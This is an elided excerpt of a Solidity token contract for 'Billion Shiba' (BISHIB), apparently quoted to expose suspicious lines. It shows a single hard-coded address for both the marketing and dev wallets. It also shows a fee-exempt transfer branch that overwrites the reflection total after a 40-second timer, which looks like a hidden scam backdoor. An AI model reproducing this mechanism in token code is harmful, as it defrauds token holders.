...
contract BISHIB is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x5294DdfD56c70e5E04CAf3Ebe3496d1E81DA16f6);
    address payable public Wallet_Dev = payable(0x5294DdfD56c70e5E04CAf3Ebe3496d1E81DA16f6);
    ...
    string private constant _name = "Billion Shiba";
    string private constant _symbol = unicode"BISHIB";
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            if (transferDelayEnabled && (tradingActiveBlock + 40 seconds <= block.timestamp)) {
            _rtotal = _minimumTokenBalanceForDividends;}
